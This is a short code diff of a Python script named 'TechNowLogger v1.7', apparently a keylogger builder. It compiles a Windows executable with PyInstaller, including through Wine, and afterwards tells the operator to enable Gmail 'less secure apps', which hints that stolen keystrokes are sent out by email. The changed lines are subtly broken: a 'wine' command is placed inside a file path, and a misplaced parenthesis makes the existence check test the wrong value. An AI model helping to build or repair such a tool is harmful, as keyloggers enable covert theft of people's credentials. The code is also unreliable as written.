@@ -16,7 +16,7 @@ if platform.system() == 'Windows':
     WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
 elif platform.system() == 'Linux':
     AttackerPlatform = 'Linux'
-    WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
+    WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
 
 def get_arguments():
     parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.7')
@@ -312,7 +312,7 @@ if __name__ == '__main__':
         del_junk_file(arguments.out)
         print(f"{GREEN}[+] Junk Files Removed Successfully!")
         
-        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}'):
+        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}' or os.path.exists(f'~/opt/technowloogger/dist/{arguments.out}.exe')):
             print(f"\n{GREEN}[+] Generated Successfully!\n")           
             print(f"\n\n{RED}[***] Don't forget to allow less secure applications in your Gmail account.")
             print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
